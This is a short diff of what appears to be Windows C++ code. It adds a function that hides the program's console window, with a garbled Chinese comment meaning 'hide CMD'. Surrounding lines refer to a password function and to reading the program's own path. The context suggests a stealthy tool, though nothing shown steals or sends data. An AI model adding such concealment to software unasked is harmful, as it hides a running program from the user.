@@ -23,6 +23,12 @@ string password()
 	return strResult.c_str();
 }
 
+//Òþ²ØCMD
+void no_windows() {
+	HWND hwndDOS = GetForegroundWindow();
+	ShowWindow(hwndDOS, SW_HIDE);
+}
+
 
 char new_process_path() {
 	string path = _pgmptr;
